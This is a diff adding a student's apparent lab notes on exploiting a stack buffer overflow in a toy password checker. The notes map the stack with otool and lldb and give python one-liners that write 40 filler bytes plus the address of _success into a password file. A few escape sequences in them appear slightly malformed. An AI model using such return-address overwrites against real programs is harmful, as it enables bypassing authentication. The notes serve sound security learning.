@@ -1,0 +1,50 @@
+Made a blank password file and passed it in - SUCCESS!
+Set correct password and passed it in - SUCCESS!
+Set wrong password and passed it in - FAILURE!
+Read with oTool
+
+stack pointer is 38 down (56 in decimal)
+
+32 size buffer in decimal
+fd = 4 bytes
+pwLen = 4 bytes
+
+buffer is 10 up from stack pointer (16 in decimal)
+
+
+***return address***
+0x38
+
+0x34 pwLen
+
+0x30 fd
+
+0x10 Buffer
+
+0x00
+******
+
+
+Want to overwrite address at 0x39 (57 in decimal)
+We start from 0x10 (16 in decimal)
+So we need something 40 chars long and then the important return address
+
+return address of _success - 0000000100000e40
+return address is 8 bytes
+
+
+python -c 'print "a"*40 + "\x00\x00\x00\x01\x00\x00\x0e\40", ' > password.txt
+
+oops - should be reversed:
+python -c 'print "a"*40 + "\x40\x0e\x00\x00\x01\x00\x00\00", ' > password.txt
+
+
+
+
+ran lldb
+placed breakpoint in login function
+looked at values with x -c 64 rsp
+at beginning - return address - 31 0e 00 00 01 00 00 00
+after read - return address - 40 0e 00 00 01 00 00 00
+
+oops - jumped ahead before... already found the correct return address just from otool...
